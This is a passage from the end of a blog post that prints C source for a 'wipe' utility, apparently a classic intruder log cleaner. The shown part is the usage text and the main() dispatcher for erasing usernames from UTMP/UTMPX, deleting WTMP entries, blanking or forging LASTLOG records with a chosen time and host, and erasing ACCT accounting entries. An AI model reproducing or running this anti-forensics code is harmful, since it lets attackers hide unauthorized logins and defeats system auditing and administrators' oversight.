</span></span><span class=line><span class=cl><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>usage</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;USAGE: wipe [ u|w|l|a ] ...options...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;UTMP editing:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;    Erase all usernames      :   wipe u [username]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;    Erase one username on tty:   wipe u [username] [tty]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;WTMP editing:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;   Erase last entry for user :   wipe w [username]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;   Erase last entry on tty   :   wipe w [username] [tty]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>	
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;LASTLOG editing:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;   Blank lastlog for user    :   wipe l [username]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;   Alter lastlog entry       :   wipe l [username] [tty] [time] [host]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;	Where [time] is in the format [YYMMddhhmm]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>#ifndef NO_ACCT
</span></span></span><span class=line><span class=cl><span class=cp></span>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;ACCT editing:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;   Erase acct entries on tty :   wipe a [username] [tty]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>	<span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span>
</span></span><span class=line><span class=cl><span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span>	<span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&lt;</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nf>usage</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * First character of first argument determines which file to edit.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=n>c</span> <span class=o>=</span> <span class=nf>toupper</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * UTMP editing.
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=k>switch</span> <span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=cm>/* UTMP */</span>
</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=sc>&#39;U&#39;</span> <span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>wipe_utmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>wipe_utmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>			
</span></span><span class=line><span class=cl><span class=cp>#ifdef HAVE_UTMPX
</span></span></span><span class=line><span class=cl><span class=cp></span>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>wipe_utmpx</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>wipe_utmpx</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>			
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=cm>/* WTMP */</span>
</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=sc>&#39;W&#39;</span> <span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>wipe_wtmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>wipe_wtmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>			
</span></span><span class=line><span class=cl><span class=cp>#ifdef HAVE_UTMPX
</span></span></span><span class=line><span class=cl><span class=cp></span>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>wipe_wtmpx</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>wipe_wtmpx</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>			
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=cm>/* LASTLOG */</span>
</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=sc>&#39;L&#39;</span> <span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>wipe_lastlog</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=nb>NULL</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>					<span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=nb>NULL</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>wipe_lastlog</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=nb>NULL</span><span class=p>,</span>
</span></span><span class=line><span class=cl>						<span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>wipe_lastlog</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=n>argv</span><span class=p>[</span><span class=mi>4</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>						<span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>==</span> <span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>wipe_lastlog</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=n>argv</span><span class=p>[</span><span class=mi>4</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>						<span class=n>argv</span><span class=p>[</span><span class=mi>5</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#ifndef NO_ACCT
</span></span></span><span class=line><span class=cl><span class=cp></span>		<span class=cm>/* ACCT */</span>
</span></span><span class=line><span class=cl>		<span class=k>case</span> <span class=sc>&#39;A&#39;</span> <span class=o>:</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>!=</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>				<span class=nf>usage</span><span class=p>();</span>
</span></span><span class=line><span class=cl>			<span class=nf>wipe_acct</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>argv</span><span class=p>[</span><span class=mi>3</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://rendoumi.com/posts/20240130-openvpn_problem/><span class=title>« 上一页</span><br><span>Openvpn 的一些问题</span>
</a><a class=next href=https://rendoumi.com/posts/20240124-aria2_baidu/><span class=title>下一页 »</span><br><span>Aria2下载网剧并极速上传到百度网盘</span></a></nav></footer><div id=comments></div><script src=https://cwd.js.org/cwd.js></script><script>const comments=new CWDComments({el:"#comments",apiBaseUrl:"https://cwd.rendoumi.qzz.io"});comments.mount()</script></article></main><footer class=footer><span>Copyright © 2020-2025 Zhang Ranrui. All Rights Reserved.</span><br>·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script></body></html>